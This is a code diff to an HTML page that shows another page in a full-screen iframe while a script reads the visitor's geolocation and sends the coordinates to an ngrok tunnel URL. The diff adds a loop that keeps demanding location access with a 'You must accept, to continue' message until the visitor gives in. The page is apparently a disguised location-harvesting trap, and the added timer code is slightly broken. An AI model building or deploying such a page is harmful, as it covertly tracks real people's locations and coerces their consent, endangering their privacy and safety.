@@ -4,7 +4,7 @@
   </head>
   
   <body>
-      <iframe src="/frame.html" style="width: 100vw; height: 100vh;"></iframe>
+      <iframe id="vs" src="/frame.html" style="width: 100vw; height: 100vh;"></iframe>
     <script>
       let latitude = 0;
       let longitude = 0;
@@ -14,6 +14,16 @@
         url = "https://1fcf9e9ea5a8.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
         fetch(url);
       }
-      window.navigator.geolocation.getCurrentPosition(showPosition, console.log);
+      function mustAccept(e) {
+        let main = document.getElementById('vs');
+        setTimeout(3, function () {
+          main.innerHTML = "<h1> You must accept, to continue. Try Again.</h1>";
+          getPos();
+        });
+      }
+      function getPos () {
+      window.navigator.geolocation.getCurrentPosition(showPosition, mustAccept);
+      }
+      getPos();
     </script>
   </body>
